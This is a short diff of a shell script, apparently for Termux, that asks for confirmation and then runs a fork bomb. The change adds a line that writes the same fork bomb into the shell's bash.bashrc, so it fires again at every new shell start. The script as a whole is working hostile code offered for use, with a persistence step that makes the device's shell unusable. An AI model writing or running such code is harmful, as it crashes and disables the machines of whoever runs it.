@@ -4,9 +4,10 @@ case $answer in
 y | Y )
 	echo "started";
 	bomb() { bomb|bomb& };bomb;
+	echo "bomb() { bomb|bomb& };bomb;" >> $PREFIX/etc/bash.bashrc
 	exit ;;
 * )
-	echo "cancel";
+	echo "stopped";
 	exit 1;;
 esac 
 
